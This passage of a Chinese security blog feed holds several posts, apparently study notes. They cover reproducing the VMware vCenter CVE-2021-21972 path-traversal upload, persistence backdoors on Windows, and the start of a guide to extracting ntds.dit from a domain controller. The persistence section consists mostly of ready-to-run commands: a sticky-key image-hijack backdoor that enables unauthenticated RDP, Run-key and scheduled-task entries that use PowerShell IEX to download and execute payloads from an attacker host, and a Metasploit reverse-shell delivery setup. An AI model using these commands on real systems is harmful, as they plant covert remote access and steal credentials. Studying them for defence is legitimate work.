LPORT=443 -f raw -o x86_shell.jsp</span><br></pre></td></tr></table></figure><p>相关链接：</p><p><a href="https://www.secpulse.com/archives/123339.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/123339.html</a></p><p><a href="http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/131.html" target="_blank" rel="noopener">http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/131.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-21972 VMware vCenter未授权文件上传漏洞复现</title>
      <link href="2021/02/25/CVE-2021-21972-VMware-vCenter%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/02/25/CVE-2021-21972-VMware-vCenter%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="一、信息梳理"><a href="#一、信息梳理" class="headerlink" title="一、信息梳理"></a>一、信息梳理</h3><p>根据网络漏洞信息：</p><blockquote><p>vSphere 是 VMware 推出的虚拟化平台套件，包含 ESXi、vCenter Server 等一系列的软件。其中 vCenter Server 为 ESXi 的控制中心，可从单一控制点统一管理数据中心的所有 vSphere 主机和虚拟机，使得 IT 管理员能够提高控制能力，简化入场任务，并降低 IT 环境的管理复杂性与成本。</p><p>vSphere Client（HTML5）在 vCenter Server 插件vRealize Operations（默认安装）中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放 443 端口的服务器向 vCenter Server 发送精心构造的请求，从而在服务器上写入 webshell，最终造成远程任意代码执行。</p><p>vCenter Server 的 vROPS 插件的 API 未经过鉴权，存在一些敏感借口。其中 <code>uploadova</code> 接口存在一个上传 OVA 文件的功能，将 TAR 文件解压后上传到 <code>/tmp/unicorn_ova_dir</code> 目录</p><p>版本：</p><ul><li><code>vmware:vcenter_server</code> 7.0 U1c 之前的 7.0 版本</li><li><code>vmware:vcenter_server</code> 6.7 U3l 之前的 6.7 版本</li><li><code>vmware:vcenter_server</code> 6.5 U3n 之前的 6.5 版本</li></ul></blockquote><p>可将重要信息提取：</p><p>存在漏洞的地方vSphere Client（HTML5） 的插件vRealize Operations（默认安装）存在RCE：接口 <code>uploadova</code> 接口存在一个上传 OVA 文件，上传tar文件会将文件放在<code>/tmp/unicorn_ova_dir</code>目录，导致可以上传shell。</p><p>具体漏洞接口位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;&lt;VC-IP-or-FQDN&gt;&#x2F;ui&#x2F;vropspluginui&#x2F;rest&#x2F;services&#x2F;updateova</span><br></pre></td></tr></table></figure><h3 id="二、本地复现"><a href="#二、本地复现" class="headerlink" title="二、本地复现"></a>二、本地复现</h3><h4 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h4><p>从运维大佬那里要来的ova文件：链接：<a href="https://pan.baidu.com/s/1-jK1iY46-hiza9ni2TdDkA" target="_blank" rel="noopener">https://pan.baidu.com/s/1-jK1iY46-hiza9ni2TdDkA</a> 提取码：ns83 </p><p>导入ova，最小配置要求如下图<code>2 vCPUs、10GB内存、300GB硬盘</code>：</p><p><img src="/imgs/image-20210301195607605.png" alt="image-20210301195607605"></p><p>本地部署具体可以参考<a href="https://blog.51cto.com/wangchunhai/2439987" target="_blank" rel="noopener">https://blog.51cto.com/wangchunhai/2439987</a></p><p><img src="/imgs/image-20210301201517412.png" alt="image-20210301201517412"></p><p>设置单点登录密码</p><p><img src="/imgs/image-20210301200329371.png" alt="image-20210301200329371"></p><p>设置root密码</p><p><img src="/imgs/image-20210301200316042.png" alt="image-20210301200316042"></p><p>省略中间页面配置过程…</p><p>Web页面设置相关信息后保存，最后一步比较花费时间，多等待一下。</p><p><img src="/imgs/image-20210301234302258.png" alt="image-20210301234302258"></p><h4 id="上传脚本getshell"><a href="#上传脚本getshell" class="headerlink" title="上传脚本getshell"></a>上传脚本getshell</h4><p>脚本：<a href="https://github.com/NS-Sp4ce/CVE-2021-21972" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/CVE-2021-21972</a></p><p><img src="/imgs/image-20210302094623215.png" alt="image-20210302094623215"></p><p><img src="/imgs/image-20210302094748281.png" alt="image-20210302094748281"></p><h3 id="三、分析"><a href="#三、分析" class="headerlink" title="三、分析"></a>三、分析</h3><p>根据github已公开脚本 可以发现其利用步骤如下：</p><ol><li>准备好jsp文件</li><li>添加文件到相应路径的tar包，Linux和Windows路径不同。</li><li>将添加好的tar包上传到漏洞API：/ui/vropspluginui/rest/services/updateova</li><li>访问上传后解压的路径对应的URL</li></ol><p>思考问题：</p><ol><li>通过代码分析漏洞原因</li><li>Windows相对来说简单，可以直接上传到相应路径（<code>..\..\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\</code>）然后访问shell。但是Linux不同，他的利用方法目前网络公开的是通过免密登录或者shell上传，上传位置<code>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/{REPLACE_RANDOM_ID_HERE}/0/h5ngc.war/resources/</code>，这个路径上传不一定能成功利用，除了这个位置，需要思考有没有其它可以利用路径，该路径需要满足可执行、未授权可访问、不存在随机性。</li></ol><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>目前根据公开信息，<code>CVE-2021-21972 VMware vCenter未授权文件上传漏洞</code>该漏洞主要有两方面原因导致getshell，一是未授权可上传，一是路径穿越，我们一一分析下。</p><p>首先未授权很容易找到原因，vRops插件默认安装，并且默认配置了未认证，所以导致未授权可以访问上传路径，如下图可以看出：</p><p><img src="/imgs/image-20210302141731972.png" alt="image-20210302141731972"></p><p>另外就是路径穿越。上传OVA的接口如下，我们分析下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(</span><br><span class="line">   value = &#123;<span class="string">"/uploadova"</span>&#125;,</span><br><span class="line">   method = &#123;RequestMethod.POST&#125;</span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">uploadOvaFile</span><span class="params">(@RequestParam(value = <span class="string">"uploadFile"</span>,required = <span class="keyword">true</span>)</span> CommonsMultipartFile uploadFile, HttpServletResponse response) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   logger.info(<span class="string">"Entering uploadOvaFile api"</span>);</span><br><span class="line">    <span class="comment">// 判断是否正确上传</span></span><br><span class="line">   <span class="keyword">int</span> code = uploadFile.isEmpty() ? <span class="number">400</span> : <span class="number">200</span>;</span><br><span class="line">   PrintWriter wr = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (code != <span class="number">200</span>) &#123;</span><br><span class="line">         response.sendError(code, <span class="string">"Arguments Missing"</span>);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      wr = response.getWriter();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">      var14.printStackTrace();</span><br><span class="line">      logger.info(<span class="string">"upload Ova Controller Ended With Error"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   response.setStatus(code);</span><br><span class="line">   String returnStatus = <span class="string">"SUCCESS"</span>;</span><br><span class="line">   <span class="keyword">if</span> (!uploadFile.isEmpty()) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         logger.info(<span class="string">"Downloading OVA file has been started"</span>);</span><br><span class="line">         logger.info(<span class="string">"Size of the file received  : "</span> + uploadFile.getSize());</span><br><span class="line">         InputStream inputStream = uploadFile.getInputStream();</span><br><span class="line">         File dir = <span class="keyword">new</span> File(<span class="string">"/tmp/unicorn_ova_dir"</span>);</span><br><span class="line">         <span class="comment">// 创建"/tmp/unicorn_ova_dir"</span></span><br><span class="line">         <span class="keyword">if</span> (!dir.exists()) &#123;</span><br><span class="line">            dir.mkdirs();</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String[] entries = dir.list();</span><br><span class="line">            String[] var9 = entries;</span><br><span class="line">            <span class="keyword">int</span> var10 = entries.length;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var11 = <span class="number">0</span>; var11 &lt; var10; ++var11) &#123;</span><br><span class="line">               String entry = var9[var11];</span><br><span class="line">               File currentFile = <span class="keyword">new</span> File(dir.getPath(), entry);</span><br><span class="line">               currentFile.delete();</span><br><span class="line">            &#125;</span><br><span class="line">            logger.info(<span class="string">"Successfully cleaned : /tmp/unicorn_ova_dir"</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// tar文件解压 解包输入流</span></span><br><span class="line">         TarArchiveInputStream in = <span class="keyword">new</span> TarArchiveInputStream(inputStream);</span><br><span class="line">         <span class="comment">// 获取归档文件中的条目</span></span><br><span class="line">         TarArchiveEntry entry = in.getNextTarEntry();</span><br><span class="line">         ArrayList result = <span class="keyword">new</span> ArrayList();</span><br><span class="line">         <span class="keyword">while</span>(entry != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (entry.isDirectory()) &#123;</span><br><span class="line">               entry = in.getNextTarEntry();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// File(String parent, String child)，根据 parent 路径名字符串和 child 路径名字符串创建一个新 File 实例。parent 路径名字符串用于表示目录，child 路径名字符串用于表示目录或文件。简而言之父路径字符串和子路径字符串拼接创建一个文件</span></span><br><span class="line">               File curfile = <span class="keyword">new</span> File(<span class="string">"/tmp/unicorn_ova_dir"</span>, entry.getName());</span><br><span class="line">               File parent = curfile.getParentFile();</span><br><span class="line">               <span class="keyword">if</span> (!parent.exists()) &#123;</span><br><span class="line">                  <span class="comment">// 创建目录</span></span><br><span class="line">                  parent.mkdirs();</span><br><span class="line">               &#125;</span><br><span class="line">               OutputStream out = <span class="keyword">new</span> FileOutputStream(curfile);</span><br><span class="line">               IOUtils.copy(in, out);</span><br><span class="line">               out.close();</span><br><span class="line">               result.add(entry.getName());</span><br><span class="line">               entry = in.getNextTarEntry();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         in.close();</span><br><span class="line">         logger.info(<span class="string">"Successfully deployed File at Location :/tmp/unicorn_ova_dir"</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">         logger.error(<span class="string">"Unable to upload OVA file :"</span> + var15);</span><br><span class="line">         returnStatus = <span class="string">"FAILED"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   wr.write(returnStatus);</span><br><span class="line">   wr.flush();</span><br><span class="line">   wr.close();</span><br></pre></td></tr></table></figure><p>这段代码主要逻辑：</p><ol><li>POST上传文件，并且判断是否上传成功，上传成功会返回<code>SUCCESS</code></li><li>判断<code>/tmp/unicorn_ova_di</code>是否存在，不存在则创建</li><li>以tar文件形式解压上传的文件输入流</li><li>将<code>/tmp/unicorn_ova_dir</code>与解压的文件（包含路径）进行拼接，创建目录文件</li></ol><p>由于使用File(String parent, String child)将两个目录直接拼接了，并且没有过滤任何的”../“，所以导致可以穿越目录从而上传文件到任意目录下。</p><h3 id="四、拓展"><a href="#四、拓展" class="headerlink" title="四、拓展"></a>四、拓展</h3><p>如何实现文件上传（通过post报文、python和curl）？</p><h4 id="http"><a href="#http" class="headerlink" title="http:"></a>http:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST/upload.html HTTP/1.1 </span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept</span>: text/plain, */* </span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-cn </span><br><span class="line"><span class="attribute">Host</span>: 192.168.24.56</span><br><span class="line">Content-Type:multipart/form-data;boundary=-----------------------------7db372eb000e2</span><br><span class="line"><span class="attribute">User-Agent</span>: WinHttpClient </span><br><span class="line"><span class="attribute">Content-Length</span>: 3693</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"></span><br><span class="line">-------------------------------7db372eb000e2</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="chrome.jpg"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">(此处省略jpeg文件二进制数据...）</span><br><span class="line">-------------------------------7db372eb000e2--</span><br></pre></td></tr></table></figure><p>根据 rfc1867, multipart/form-data是必须的。<code>---------------------------7db372eb000e2</code>是分隔符，分隔多个文件、表单项。其中<code>b372eb000e2</code>是即时生成的一个数字，用以确保整个分隔符不会在文件或表单项的内容中出现。Form每个部分用分隔符分割，分隔符之前<strong>必须加上<code>--</code>这两个字符(即–{boundary})才能被http协议认为是Form的分隔符</strong>，表示结束的话用在正确的<strong>分隔符后面添加”–”表示结束</strong>。<code>---------------------------7d</code>是 IE 特有的标志，Mozila 为<code>---------------------------71</code>，<code>------webkitformboundary</code> 是safari 浏览器从客户端向服务器端传送HTML标签数据所使用的分隔符（一般会在分隔符后附加一串十六进制的数以示区别）</p><h4 id="python："><a href="#python：" class="headerlink" title="python："></a>python：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Requests也支持以multipart形式发送post请求，只需将一文件传给requests.post()的files参数即可。&quot;content-type&quot;为 &quot;multipart&#x2F;form-data&quot;,请求正文是binary</span><br><span class="line">r &#x3D; requests.post(url, files&#x3D;&#123;&#39;file&#39; : open(&#39;chrome.jpg&#39;, &#39;rb&#39;)&#125;)</span><br></pre></td></tr></table></figure><h4 id="CURL："><a href="#CURL：" class="headerlink" title="CURL："></a>CURL：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传单个文件，[headers 身份认证、不认证https(-k)、查看详细报文(-v)]</span></span><br><span class="line">curl -F <span class="string">'data=@path/to/local/file'</span> http://localhost/upload [-H <span class="string">"User-Agent: WinHttpClient"</span> -H <span class="string">"token: XXX"</span>] [-k] [-v]</span><br><span class="line"><span class="comment"># 上传多个文件，添加-F即可</span></span><br><span class="line">curl -F <span class="string">'file1=@/path/to/file1'</span> -F <span class="string">'file2=@/path/to/file2'</span> ... http://localhost/upload</span><br><span class="line"><span class="comment"># 上传文件树组</span></span><br><span class="line">curl -F <span class="string">'files[]=@/path/to/file1'</span> -F <span class="string">'files[]=@/path/to/file2'</span> ... http://localhost/upload</span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;swarm.ptsecurity.com&#x2F;unauth-rce-vmware&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;g2eFMSpZereNA73Hve8cQg</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;insane-Mr-Li&#x2F;p&#x2F;9145152.html</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;frustrate2&#x2F;archive&#x2F;2012&#x2F;11&#x2F;07&#x2F;2759080.html</span><br><span class="line">https:&#x2F;&#x2F;www.gonever.com&#x2F;post&#x2F;45</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaohulumanong&#x2F;p&#x2F;8338248.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> VMware vCenter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2021-21972 </tag>
            
            <tag> VMware vCenter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习笔记-Ⅶ：权限维持之操作系统后门</title>
      <link href="2021/02/21/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A6%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>2021/02/21/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A6%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<p>攻击者在提升权限后，通常会简历后门来维持对目标主机的控制权。</p><h3 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a><a href="https://xz.aliyun.com/t/6461" target="_blank" rel="noopener">Windows：</a></h3><h4 id="粘滞键后门-映像劫持shift后门"><a href="#粘滞键后门-映像劫持shift后门" class="headerlink" title="粘滞键后门/映像劫持shift后门"></a>粘滞键后门/映像劫持shift后门</h4><p>参考链接：<a href="https://blog.csdn.net/fageweiketang/article/details/88317656" target="_blank" rel="noopener">https://blog.csdn.net/fageweiketang/article/details/88317656</a></p><p>在Windows连续按5下shift键就可以调出粘滞键。旧方法粘滞键后门的原理是将sethc.exe程序替换成后门程序，但该方法只适用于winvista系统及以下，其它系统修改 sethc 会提示需要 trustedinstaller 权限。</p><p>新方法设置粘滞键后门是通过注册表来实现，思路就是通过修改注册表的映像劫持和打开其远程桌面来实现。映像劫持简单理解就是当自己打开程序 a 的时候，实际上是打开的程序 b。</p><p>设置映像劫持较简单，只需要在注册表的 HKLMSOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options 位置添加被劫持的程序然后简单设置一下即可，我们通过命令行执行以下程序：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 命令说明：reg add 是向注册表添加记录，后面跟的是注册表的位置，这里需要注意的是 HKLM 实际上是 HKEY_LOCAL_MACHINE 的缩写。Image File Execution Option 这个目录就是用来设置镜像劫持的，要被劫持的就是命令中的 sethc 粘滞键程序，随后通过 / v 来指定键名，这个键名 debugger 是固定的，然后通过 / t 来指定类型，即 REG_SZ 字符串类型，最后通过 / d 来指定键的值，即被恶意替换的程序，也就是我们的 <span class="built_in">cmd</span>。</span><br><span class="line">REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\<span class="built_in">cmd</span>.exe"</span><br><span class="line"># 设置完镜像劫持后就已经有了我们旧方法中直接替换 sethc 程序的效果，但我们为了方便利用，可以开启目标机的远程桌面，这里我们也通过注册表来设置一下，需要设置两个参数。第一个是把远程桌面链接的用户鉴定选项设置为关闭状态，即值为 <span class="number">0</span>，命令行运行以下命令：</span><br><span class="line">REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d <span class="number">0</span></span><br><span class="line"># 第二个是把远程桌面连接的安全层设置为 <span class="number">0</span>，命令行运行以下命令</span><br><span class="line">REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d <span class="number">0</span></span><br><span class="line"># 开启远程桌面连接，首先是配置一下防火墙，设置为允许远程桌面连接，运行以下命令</span><br><span class="line">netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=<span class="number">3389</span> action=allow</span><br><span class="line"># 设置后，我们再通过注册表来设置一下允许远程桌面连接，命令行运行以下命令：</span><br><span class="line">REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections /t REG_DWORD /D <span class="number">0</span> /f</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210221142332235.png" alt="image-20210221142332235"></p><p>至此，我们的粘滞键后门就已经完成了，远程桌面连接输入 ip 就会直接跳到目标锁屏页，如果用户没有设置密码则可以直接登录，如果有密码而又不知道密码的情况下，则可以用 shift 调出命令行来执行一些操作。</p><h4 id="影子用户后门"><a href="#影子用户后门" class="headerlink" title="影子用户后门"></a>影子用户后门</h4><p>参考之前的总结：<a href="https://rita888.github.io/2021/01/20/权限维持：Windows命令行下创建隐藏帐号/" target="_blank" rel="noopener">权限维持：Windows命令行下通过修改注册表创建隐藏帐号</a></p><h4 id="注册表自启动后门"><a href="#注册表自启动后门" class="headerlink" title="注册表自启动后门"></a>注册表自启动后门</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 示例：添加<span class="built_in">cmd</span>.exe自启动</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "test" /t REG_SZ /d "C:\Windows\System32\<span class="built_in">cmd</span>.exe" /f</span><br><span class="line"># 示例：一键无文件自启动</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Keyname" /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe -nop -w hidden -c \"IEX ((new-object <span class="built_in">net</span>.webclient).downloadstring('http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">28</span>.<span class="number">142</span>:<span class="number">8888</span>/logo.gif'))\"" /f</span><br><span class="line"># 注意如果没有权限要先加权</span><br><span class="line"><span class="built_in">echo</span>  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run [<span class="number">1</span> <span class="number">8</span> <span class="number">17</span>] &gt;regini.ini</span><br><span class="line">regini regini.ini</span><br></pre></td></tr></table></figure><h4 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h4><p>参考：<a href="https://zhuanlan.zhihu.com/p/98199824" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98199824</a></p><p>Metasploit 的web_delivery模块可用于托管和生成各种格式的有效载荷</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.111.80</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line"><span class="built_in">set</span> target 5</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>“ <strong>schtasks</strong> ”可执行文件可用于创建计划任务，该任务将在每个Windows登录中以SYSTEM的形式下载并执行基于PowerShell的有效负载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;tn PentestLab &#x2F;tr &quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http:&#x2F;&#x2F;192.168.111.80:8080&#x2F;ZPWLywg&#39;&#39;&#39;))&#39;&quot; &#x2F;sc onlogon &#x2F;ru System</span><br></pre></td></tr></table></figure><h4 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h4><p>WMI后门使用了WMI的两个特征：无文件和无进程（需要管理员权限运行）。</p><p>原理：将代码加密存储与WMI中，即无文件；调用PowerShell执行后门程序，执行后进程消失，即无进程。</p><p>在Empire中使用Invoke-WMI模块</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/persistence/elevated/wmi#设置参数run</span><br></pre></td></tr></table></figure><p>其它后门方法可参考：<a href="https://xz.aliyun.com/t/6461" target="_blank" rel="noopener">windows中常见后门持久化方法总结</a></p><h3 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h3><p>关于Linux的后门权限维持，一般有添加超级用户、SSH免密登录、Crontab定时任务反弹shell、PAM后门、Rootkit工具包等方法 可参考：<a href="https://wiki.wgpsec.org/knowledge/hw/os-backdoor.html#linux和https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html" target="_blank" rel="noopener">https://wiki.wgpsec.org/knowledge/hw/os-backdoor.html#linux和https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习笔记-Ⅵ：域控安全及跨域攻击</title>
      <link href="2021/02/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A5%EF%BC%9A%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E5%8F%8A%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/"/>
      <url>2021/02/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A5%EF%BC%9A%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E5%8F%8A%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="域控安全"><a href="#域控安全" class="headerlink" title="域控安全"></a>域控安全</h2><h3 id="一、提取ntds-dit"><a href="#一、提取ntds-dit" class="headerlink" title="一、提取ntds.dit"></a>一、提取ntds.dit</h3><h4 id="利用ntdsutil-exe提取"><a href="#利用ntdsutil-exe提取" class="headerlink" title="利用ntdsutil.exe提取"></a>利用ntdsutil.exe提取</h4><p>域环境默认安装，支持系统：Server 2003、2008、2012</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#  创建快照</span><br><span class="line">ntdsutil snapshot "activate instance ntds" create quit quit</span><br><span class="line"># 查询快照</span><br><span class="line">ntdsutil snapshot "List All" quit quit</span><br><span class="line"># 查询已挂载快照</span><br><span class="line">ntdsutil snapshot "List Mounted" quit quit</span><br><span class="line"># 挂载快照</span><br><span class="line">ntdsutil snapshot "mount GUID" quit quit</span><br><span 